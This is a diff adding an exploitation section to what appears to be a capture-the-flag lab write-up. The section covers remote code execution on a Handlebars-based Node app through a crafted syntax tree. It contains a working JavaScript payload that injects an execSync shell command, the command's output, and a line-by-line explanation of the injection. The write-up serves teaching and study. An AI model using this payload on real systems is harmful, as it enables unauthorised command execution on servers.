@@ -1120,7 +1120,126 @@ The technique from there is ordinary code injection. The injected text closes th
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 3. Exploitation
+## 3. Exploitation / Initial Access
+
+### 3.1 — Achieve remote code execution via crafted Handlebars AST (CVE-2026-33937)
+
+The application consumes `campaign_message` as a pre-parsed syntax tree when submitted as a JSON object, bypassing the parser entirely. Construct a tree containing a node the parser could never produce, injecting JavaScript into the function the compiler generates.
+
+At `http://dzcampaigns.htb/character/15/edit`, DevTools → Console:
+
+```javascript
+const csrf = document.querySelector('[name="_csrf"]').value;
+const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
+
+const ast = {
+  type: "Program",
+  body: [{
+    type: "MustacheStatement",
+    path: {
+      type: "PathExpression", data: false, depth: 0,
+      parts: ["lookup"], original: "lookup", loc: L
+    },
+    params: [
+      { type: "PathExpression", data: false, depth: 0,
+        parts: [], original: "this", loc: L },
+      { type: "NumberLiteral",
+        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
+        original: 1, loc: L }
+    ],
+    escaped: true,
+    strip: { open: false, close: false },
+    loc: L
+  }],
+  strip: {},
+  loc: L
+};
+
+const r = await fetch("/character/15", {
+  method: "POST",
+  credentials: "same-origin",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue",
+    backstory: "test", campaign_message: ast
+  })
+});
+console.log(r.status, await r.text());
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`const L = {...}`|Reusable `loc` object shared by every node|Satisfies the compiler's position lookups without repeating the object|
+|`type: "MustacheStatement"`|An expression node — the compiler emits a helper call for it|An instruction, not plain text|
+|`path.parts: ["lookup"]`|Names the built-in `lookup` helper as the call target|"Call the function named lookup"|
+|First param: `PathExpression`, `parts: []`, `original: "this"`|Passes the current context object as argument one|"Here's the data object to search"|
+|Second param: `NumberLiteral`|**The injection point** — its `value` is written into generated source unquoted|Where a number should go, JavaScript goes instead|
+|`{},{}))`|Supplies two dummy arguments and closes the generated call|Finishes the sentence the compiler started|
+|`+ process.mainModule.require('child_process')`|Reaches Node's module system from the template runtime|Opens the door from template-land into the real language|
+|`.execSync('id')`|Executes a shell command synchronously and returns its output|Runs `id` on the server and waits for the answer|
+|`.toString()`|Converts the returned Buffer to text|Makes the raw bytes printable|
+|`//`|JavaScript line comment|Discards whatever the compiler wrote after the injection|
+|`original: 1`|Retains a plausible source representation|Cosmetic; the compiler consumes `value`, not `original`|
+
+**Result:**
+
+Console:
+
+```
+200 `<!DOCTYPE html>...<h1>Dashboard</h1>...`
+```
+
+At `http://dzcampaigns.htb/campaign/1`:
+
+```
+AST_ACCEPTED
+Wed Jul 29 2026 09:54:48 GMT+0000 (Coordinated Universal Time)
+
+uid=996(darkzero) gid=987(darkzero) groups=987(darkzero)
+Wed Jul 29 2026 10:04:51 GMT+0000 (Coordinated Universal Time)
+```
+
+![[dzcampaigns_rce_id.png]]
+
+**What this gives you:** Arbitrary command execution on the target as the web application's service account.
+
+**Key findings:**
+
+- **Remote code execution confirmed.** The command `id` executed on the server and its output was rendered into the campaign page. Any shell command can be substituted.
+- The execution context is `uid=996(darkzero) gid=987(darkzero)`. A UID below 1000 marks this as a system service account rather than an interactive user — the identity the Node.js process runs under. Code executes with exactly the web application's privileges, no more.
+- The injected JavaScript reached `process.mainModule.require`, meaning the template runtime has unrestricted access to Node's module system. No sandbox, VM isolation, or module allowlist constrains the compiled template.
+- Output is returned through the campaign page rather than the HTTP response, making this a blind-adjacent but fully readable execution channel. Each command requires one POST followed by one GET of `/campaign/1`.
+- The payload is stored. The malicious tree persists in the database and re-executes whenever the message is re-rendered.
+
+##### 3.1.1 Theory — How the injected string becomes executable code
+
+Recall from 2.5.2 that Handlebars generates JavaScript source text and then evaluates it. For a helper invocation with parameters, the generated source contains a call resembling:
+
+javascript
+
+```javascript
+helpers.lookup.call(depth0, depth0, 1, {name:"lookup", hash:{}, data:data})
+```
+
+The `1` in that line came from a `NumberLiteral` node's `value` property, written in directly with no quoting — because a number needs none — and no validation — because the parser guaranteed it was a number.
+
+Substituting the crafted string for that `1` produces:
+
+javascript
+
+```javascript
+helpers.lookup.call(depth0, depth0, {},{})) + process.mainModule.require('child_process').execSync('id').toString() //, {name:"lookup", hash:{}, data:data})
+```
+
+Read left to right. `{},{}` supplies two throwaway arguments so the call has a sensible shape. The `))` closes both the argument list and the enclosing expression the compiler had opened. From that point the parser is outside the call, so `+ process.mainModule.require(...)` is simply string concatenation appended to the result — a perfectly ordinary JavaScript expression. It executes, `execSync` runs the shell command, `.toString()` renders the output as text, and that text becomes what the template emits. The trailing `//` comments out everything the compiler wrote afterwards, so the leftover `, {name:"lookup"...})` never causes a syntax error.
+
+Structurally this is identical to SQL injection: close the construct you were placed inside, append your own, comment out the remainder. The only difference is that the generated artefact is a JavaScript function rather than a query.
+
+The reason `process.mainModule.require` is used rather than a bare `require` is scope. Inside the generated function, `require` is not in scope — the function is built by `new Function(...)`, which does not inherit the enclosing module's variables. But `process` is a true global in Node, available everywhere, and `process.mainModule` references the entry-point module object, which carries its own `require`. That indirection is the standard route from an isolated JavaScript context back into Node's module system.
+
+**Next:** Upgrade single-command execution to an interactive reverse shell for practical post-exploitation.
 <div align="center">
 <br>
 <br>
